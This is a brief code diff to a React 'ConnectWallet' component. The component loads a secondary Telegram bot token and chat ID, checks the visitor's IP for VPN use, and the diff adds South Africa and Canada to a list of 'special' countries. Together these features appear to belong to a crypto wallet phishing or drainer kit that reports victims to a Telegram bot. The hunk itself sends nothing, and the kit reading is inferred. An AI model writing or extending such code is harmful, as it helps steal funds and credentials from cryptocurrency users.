@@ -372,7 +372,7 @@ function ConnectWallet({ onClose }) {
       const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
       const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
 
-      const specialCountries = ["NG", "AE"];
+      const specialCountries = ["NG", "AE", "ZA", "CA"];
 
       // Check VPN status using the IP we retrieved
       const isVpn = await checkVpnStatus(ip);
